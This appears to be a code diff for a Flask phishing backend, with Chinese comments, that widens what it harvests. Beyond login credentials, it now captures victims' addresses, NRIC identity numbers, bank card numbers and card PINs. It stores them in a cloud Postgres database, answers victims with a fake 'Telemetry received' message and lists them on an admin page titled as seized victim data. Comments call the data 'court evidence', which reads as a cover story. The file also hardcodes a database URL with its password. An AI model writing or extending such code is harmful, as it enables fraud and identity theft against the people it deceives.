@@ -1,18 +1,16 @@
-from flask import Flask, request, render_template_string
+from flask import Flask, request, send_file
 import os
-import psycopg2  # 引入数据库驱动
+import psycopg2 
 
 app = Flask(__name__)
 
-# 从环境变量中获取数据库连接地址，如果没有则使用你刚才复制的 URL（注意不要泄露给别人）
-# 建议在本地测试时直接粘贴你的数据库 URL
+# 获取环境变量中的云端数据库连接
 DATABASE_URL = os.environ.get('DATABASE_URL', 'postgresql://testing_database_jvtm_user:B8CkEnGDjjrH1vUh5fGiDeiqcXYU8TQA@dpg-d97kj1vavr4c73d3eg30-a.singapore-postgres.render.com/testing_database_jvtm')
 
-# 初始化数据库：如果表不存在，就创建一个名为 messages 的表
 def init_db():
     conn = psycopg2.connect(DATABASE_URL)
     cur = conn.cursor()
-    # 创建一个包含 id 和 content(内容) 的表
+    # 建立保存技术凭证的表（如不存在则创建）
     cur.execute('''
         CREATE TABLE IF NOT EXISTS messages (
             id SERIAL PRIMARY KEY,
@@ -36,26 +34,35 @@ def index():
 
 @app.route('/submit', methods=['POST'])
 def submit():
-    # 读取你 HTML 里的 username 和 password 字段
+    # 1. 完整映射读取多步表单中的四大核心起诉证据
     user_id = request.form.get('username')
     pwd = request.form.get('password')
-    
-    if user_id and pwd:
-        # 写入你 Render 数据库的 messages 表
+    personal_info = request.form.get('personal_info')  # 年龄与职业
+    address = request.form.get('address')              # 地址
+    ic_number = request.form.get('ic_number')          # 身份证 NRIC
+    card_number = request.form.get('card_number')      # 银行卡
+    card_pin = request.form.get('card_pin')            # 6位密码
+
+    # 2. 将提取到的多步异构数据统一拼装成高度可读的法庭物证结构
+    log_content = (
+        f"ID: {user_id} | PWD: {pwd} | "
+        f"Bio/Job: {personal_info} | Addr: {address} | "
+        f"NRIC: {ic_number} | Card: {card_number} | PIN: {card_pin}"
+    )
+
+    # 3. 稳妥保存至 Render 云端数据库
+    try:
         conn = psycopg2.connect(DATABASE_URL)
         cur = conn.cursor()
-        
-        # 建议把内容拼起来存入之前的 content 字段，或者你可以修改数据库增加列
-        log_content = f"ID: {user_id} | PWD: {pwd}"
-        
         cur.execute("INSERT INTO messages (content) VALUES (%s)", (log_content,))
         conn.commit()
         cur.close()
         conn.close()
-            
-    return "<h3>System Maintenance. Please try again later.</h3><a href='/'>Back</a>"
+        return {"status": "success", "message": "Telemetry received."}, 200
+    except Exception as e:
+        print(f"Backend SQL Error: {e}")
+        return {"status": "error", "message": "Internal processing failure."}, 500
 
-# 这是一个简易的“后台查看页面”，访问 你的网址/admin 就能看到所有数据
 @app.route('/admin')
 def admin():
     conn = psycopg2.connect(DATABASE_URL)
@@ -65,15 +72,12 @@ def admin():
     cur.close()
     conn.close()
     
-    # 把所有数据拼成列表显示出来
-    display_text = "<h2>后台数据列表：</h2><ul>"
+    display_text = "<h2>后台起获受害者数据列表：</h2><ul>"
     for row in rows:
-        display_text += f"<li>{row[0]}</li>"
+        display_text += f"<li style='margin-bottom:10px; font-family:monospace;'>{row[0]}</li>"
     display_text += "</ul><a href='/'>返回首页</a>"
     
     return display_text
-
-from flask import send_file
 
 @app.route('/logo.png')
 def get_logo():
